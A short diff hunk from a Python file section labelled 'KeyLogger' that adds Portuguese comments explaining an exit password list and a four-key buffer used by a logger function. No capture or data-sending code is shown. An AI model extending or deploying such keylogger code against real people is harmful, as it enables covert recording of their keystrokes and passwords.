@@ -137,8 +137,8 @@ import threading
 import re
 
 # KeyLogger
-password_to_exit = ['v','1','d','4']
-pass_keys = deque(maxlen=4)
+password_to_exit = ['v','1','d','4'] # Senha para sair da func logger()
+pass_keys = deque(maxlen=4)	# o "4" representa o nmr de caracteres, mudar conforme password_to_exit
 
 logArr = list()
 def listToString(a):    # Converte a lista para string
